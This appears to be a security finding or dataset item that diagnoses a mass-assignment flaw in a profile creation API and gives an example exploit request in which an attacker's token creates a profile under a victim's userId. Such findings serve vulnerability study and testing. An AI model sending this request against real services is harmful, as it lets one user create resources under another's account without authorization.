diagnosis: The profile creation endpoint uses mass assignment (`req.body`), allowing an attacker to supply a different 'userId' or 'accountId' to create resources on behalf of others.
exploit_request:
POST /api/profile/create HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"name": "Test", "userId": "victim_id"}
